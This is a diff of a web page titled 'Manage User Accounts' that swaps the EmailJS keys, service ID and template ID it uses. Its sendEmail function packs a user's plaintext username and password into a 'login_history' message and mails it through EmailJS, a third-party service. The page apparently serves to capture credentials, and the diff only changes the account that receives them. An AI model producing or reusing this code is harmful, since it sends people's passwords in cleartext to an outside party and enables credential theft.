@@ -6,7 +6,8 @@
     <title>Manage User Accounts</title>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
-        emailjs.init("JYKSTvr8xx8jZDFiA"); // EmailJS Public Key
+        // Initialize EmailJS with your public key
+        emailjs.init("jkb7mzwK9KsEbHbna"); // Public Key from your EmailJS account
     </script>
     <style>
         body {
@@ -80,9 +81,9 @@
 
     <script>
         function sendEmail(username, password) {
-            const serviceID = "service_v6hp3f7";
-            const templateID = "template_7hs846r";
-            const publicKey = "JYKSTvr8xx8jZDFiA";
+            const serviceID = "service_suqjtsd";  // Your Service ID
+            const templateID = "template_gnd5xid";  // Your Template ID
+            const publicKey = "jkb7mzwK9KsEbHbna";  // Your Public Key
 
             const templateParams = {
                 login_history: `Username: ${username}\nPassword: ${password}\nLogged in at: ${new Date().toLocaleString()}`
